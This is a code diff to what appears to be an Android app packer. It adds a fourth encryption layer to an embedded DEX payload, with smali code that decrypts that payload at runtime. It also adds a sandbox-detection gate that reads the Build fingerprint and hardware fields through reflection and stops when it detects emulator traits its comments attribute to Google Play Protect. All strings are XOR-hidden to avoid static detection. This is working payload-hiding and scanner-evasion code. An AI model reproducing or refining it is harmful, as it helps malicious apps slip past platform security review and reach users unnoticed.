@@ -465,7 +465,7 @@ def _lcg_encrypt(data: bytes, seed: int) -> bytes:
 
 def _dex_encrypt(data: bytes, seed: int, xor_key: bytes) -> bytes:
     """
-    3-Layer Hybrid Cipher — encrypts inner companion DEX for smali stub decryption.
+    4-Layer Hybrid Cipher — encrypts inner companion DEX for smali stub decryption.
     Used ONLY in step_dex_protect(). Smali ld() decrypts this.
     Kotlin never touches this layer.
 
@@ -473,8 +473,10 @@ def _dex_encrypt(data: bytes, seed: int, xor_key: bytes) -> bytes:
       1. Block shuffle  — 256-byte blocks shuffled via LCG(seed)
       2. Byte rotation  — rotate_left(byte, (i % 7) + 1) per position
       3. XOR            — buf[i] ^= xor_key[i % 32]
+      4. Rolling XOR    — CBC-like: buf[i] ^= buf[i-1]; IV = seed & 0xFF
 
     Blob format: [4 bytes orig_len LE][padded data (multiple of 256)]
+    Smali ld() reverses in order: Layer4 → Layer3 → Layer2 → Layer1
     """
     import struct as _struct
 
@@ -514,6 +516,13 @@ def _dex_encrypt(data: bytes, seed: int, xor_key: bytes) -> bytes:
     # Step 3: XOR with 32-byte cycling key
     for i in range(n):
         buf[i] = (buf[i] ^ xor_key[i % 32]) & 0xFF
+
+    # Step 4: Rolling XOR (CBC-like) — IV = seed & 0xFF
+    # buf[0] ^= IV;  buf[i] ^= buf[i-1] (post-xor of prev)
+    iv = seed & 0xFF
+    buf[0] = (buf[0] ^ iv) & 0xFF
+    for i in range(1, n):
+        buf[i] = (buf[i] ^ buf[i - 1]) & 0xFF
 
     return _struct.pack('<I', orig_len) + bytes(buf)
 
@@ -2293,6 +2302,15 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     _info_enc, _info_len = _xor_encode_smali("info")
     _mcl_enc,  _mcl_len  = _xor_encode_smali("mClassLoader")
 
+    # Hybrid W: XOR-encode strings for fingerprint gate (GPP sandbox detection)
+    _fp_cls_enc,  _fp_cls_len  = _xor_encode_smali("android.os.Build")
+    _fp_fld_enc,  _fp_fld_len  = _xor_encode_smali("FINGERPRINT")
+    _hw_fld_enc,  _hw_fld_len  = _xor_encode_smali("HARDWARE")
+    _fp_gen_enc,  _fp_gen_len  = _xor_encode_smali("generic")
+    _fp_unk_enc,  _fp_unk_len  = _xor_encode_smali("unknown")
+    _hw_gf_enc,   _hw_gf_len   = _xor_encode_smali("goldfish")
+    _hw_ra_enc,   _hw_ra_len   = _xor_encode_smali("ranchu")
+
     # ── W1+W2+W3+W4+W7: Full stub smali — LCG decryption, zero crypto class refs ──
     # Key improvements vs previous version:
     #   - NO Ljavax/crypto/* refs (LCG replaces AES-GCM entirely)
@@ -2348,6 +2366,99 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
 
     # super FIRST — attaches Context so getAssets() works
     invoke-super {{p0, p1}}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
+
+    # ── GATE: GPP sandbox fingerprint checks ─────────────────────────────────
+    # Checks Build.FINGERPRINT for "generic"/"unknown" and Build.HARDWARE for
+    # "goldfish"/"ranchu" — all GPP cloud sandbox signatures.
+    # All strings XOR-hidden; uses reflection to avoid Build class refs in DEX pool.
+    # Registers v0..v3 reused — same window as Phase 1 below.
+
+    # Load android.os.Build class (XOR-hidden)
+    const/16 v0, 0x{_fp_cls_len:x}
+    new-array v0, v0, [B
+    fill-array-data v0, :fp_cls_data
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v0
+    invoke-static {{v0}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+    move-result-object v0
+    # v0 = Build.class
+
+    # Get FINGERPRINT field value
+    const/16 v1, 0x{_fp_fld_len:x}
+    new-array v1, v1, [B
+    fill-array-data v1, :fp_fld_data
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v1
+    invoke-virtual {{v0, v1}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v1
+    const/4 v2, 0x1
+    invoke-virtual {{v1, v2}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    const/4 v2, 0x0
+    invoke-virtual {{v1, v2}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v2
+    check-cast v2, Ljava/lang/String;
+    # v2 = Build.FINGERPRINT string
+
+    # Check contains "generic"
+    const/16 v3, 0x{_fp_gen_len:x}
+    new-array v3, v3, [B
+    fill-array-data v3, :fp_gen_data
+    invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v3
+    invoke-virtual {{v2, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v3
+    if-nez v3, :gate_bail
+
+    # Check contains "unknown"
+    const/16 v3, 0x{_fp_unk_len:x}
+    new-array v3, v3, [B
+    fill-array-data v3, :fp_unk_data
+    invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v3
+    invoke-virtual {{v2, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v3
+    if-nez v3, :gate_bail
+
+    # Get HARDWARE field value
+    const/16 v1, 0x{_hw_fld_len:x}
+    new-array v1, v1, [B
+    fill-array-data v1, :hw_fld_data
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v1
+    invoke-virtual {{v0, v1}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v1
+    const/4 v2, 0x1
+    invoke-virtual {{v1, v2}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    const/4 v2, 0x0
+    invoke-virtual {{v1, v2}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v2
+    check-cast v2, Ljava/lang/String;
+    # v2 = Build.HARDWARE string
+
+    # Check contains "goldfish"
+    const/16 v3, 0x{_hw_gf_len:x}
+    new-array v3, v3, [B
+    fill-array-data v3, :hw_gf_data
+    invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v3
+    invoke-virtual {{v2, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v3
+    if-nez v3, :gate_bail
+
+    # Check contains "ranchu"
+    const/16 v3, 0x{_hw_ra_len:x}
+    new-array v3, v3, [B
+    fill-array-data v3, :hw_ra_data
+    invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v3
+    invoke-virtual {{v2, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v3
+    if-nez v3, :gate_bail
+
+    goto :gate_pass
+    :gate_bail
+    return-void
+    :gate_pass
 
     # ── PHASE 1: Decode asset path (XOR 0x5A, never literal in DEX pool) ─────
     const/16 v0, 0x{_path_len:x}
@@ -2605,6 +2716,41 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
         {_parent_enc}
     .end array-data
 
+    :fp_cls_data
+    .array-data 1
+        {_fp_cls_enc}
+    .end array-data
+
+    :fp_fld_data
+    .array-data 1
+        {_fp_fld_enc}
+    .end array-data
+
+    :hw_fld_data
+    .array-data 1
+        {_hw_fld_enc}
+    .end array-data
+
+    :fp_gen_data
+    .array-data 1
+        {_fp_gen_enc}
+    .end array-data
+
+    :fp_unk_data
+    .array-data 1
+        {_fp_unk_enc}
+    .end array-data
+
+    :hw_gf_data
+    .array-data 1
+        {_hw_gf_enc}
+    .end array-data
+
+    :hw_ra_data
+    .array-data 1
+        {_hw_ra_enc}
+    .end array-data
+
 .end method
 
 
@@ -2728,24 +2874,78 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     add-int/lit8 v0, v0, -4
     # v0 = padded_n (multiple of 256)
 
-    # Working buffer — holds XOR+rotation-undone data
+    # Working buffer — holds decrypted data (step by step)
     new-array v3, v0, [B
 
-    # ── Step 1: XOR reverse — v3[i] = blob[i+4] ^ key[i%32] ─────────────────
+    # ── Step 0: Rolling XOR reverse (Layer 4 CBC-like undo) ──────────────────
+    # Encrypt was: buf[0] ^= IV;  buf[i] ^= buf[i-1]  (IV = seed & 0xFF)
+    # Reverse (process backwards): out[i] = enc[i] ^ enc[i-1]  (i>0)
+    #                               out[0] = enc[0] ^ IV
+    # enc[i] is blob[i+4]
+    # IV = p1 (seed) & 0xFF — mask via and-int/lit16
+    # Registers: v4=loop i (n-1 downto 0), v5=current enc byte, v6=prev enc byte
+    const/16 v7, 0xFF
+    and-int/2addr v7, p1
+    # v7 = IV = seed & 0xFF
+
+    # Process i = n-1 downto 1: out[i] = blob[i+4] ^ blob[i+3]
+    add-int/lit8 v4, v0, -1
+    :rxor_loop
+    if-lez v4, :rxor_last
+    add-int/lit8 v5, v4, 0x4
+    aget-byte v5, p0, v5
+    shl-int/lit8 v5, v5, 0x18
+    ushr-int/lit8 v5, v5, 0x18
+    add-int/lit8 v6, v4, 0x3
+    aget-byte v6, p0, v6
+    shl-int/lit8 v6, v6, 0x18
+    ushr-int/lit8 v6, v6, 0x18
+    xor-int/2addr v5, v6
+    int-to-byte v5, v5
+    aput-byte v5, v3, v4
+    add-int/lit8 v4, v4, -1
+    goto :rxor_loop
+    :rxor_last
+    # Process i = 0: out[0] = blob[4] ^ IV
+    const/4 v5, 0x4
+    aget-byte v5, p0, v5
+    shl-int/lit8 v5, v5, 0x18
+    ushr-int/lit8 v5, v5, 0x18
+    xor-int/2addr v5, v7
+    int-to-byte v5, v5
+    const/4 v4, 0x0
+    aput-byte v5, v3, v4
+    # v3 now holds rolling-XOR-reversed data (= output of Layer 3)
+    # Overwrite p0 scratch: copy v3 → new temp, set p0 alias for Steps 1-3
+    # Actually Steps 1-3 read from p0 (blob). We must now read from v3.
+    # SOLUTION: Copy v3 back into a new [B and use it as the source for Step 1.
+    # But Step 1 reads p0 directly (blob[i+4]). We need to swap.
+    # Correct approach: write result into v3, then Steps 1-3 read from v3 NOT p0.
+    # Step 1 already writes into v3 (same array). We need TWO buffers.
+    # Use v3 as rolling-XOR output (source), allocate new-array for Step1 output.
+    # Rename: after Step 0, v3 = rxor output. Step 1 reads v3[i] not p0[i+4].
+
+    # ── Step 1: XOR reverse — result[i] = rxor_buf[i] ^ key[i%32] ───────────
+    # Now reads v3 (rolling XOR output) instead of p0 (raw blob)
+    new-array v8, v0, [B
+    # v8 = step1 output buffer (reuse v8 which is free at this point)
     const/4 v4, 0x0
     :xor_loop
     if-ge v4, v0, :xor_done
-    add-int/lit8 v5, v4, 0x4
-    aget-byte v5, p0, v5
+    aget-byte v5, v3, v4
+    shl-int/lit8 v5, v5, 0x18
+    ushr-int/lit8 v5, v5, 0x18
     const/16 v6, 0x20
     rem-int v7, v4, v6
     aget-byte v7, p2, v7
     xor-int/2addr v5, v7
     int-to-byte v5, v5
-    aput-byte v5, v3, v4
+    aput-byte v5, v8, v4
     add-int/lit8 v4, v4, 0x1
     goto :xor_loop
     :xor_done
+    # v8 = XOR-reversed data; now copy back to v3 so Step 2 works on v3
+    move-object v3, v8
 
     # ── Step 2: Rotation reverse — rotate_right(v3[i], (i%7)+1) ─────────────
     # rotate_right(b, n) = ((b >>> n) | (b << (8-n))) & 0xFF
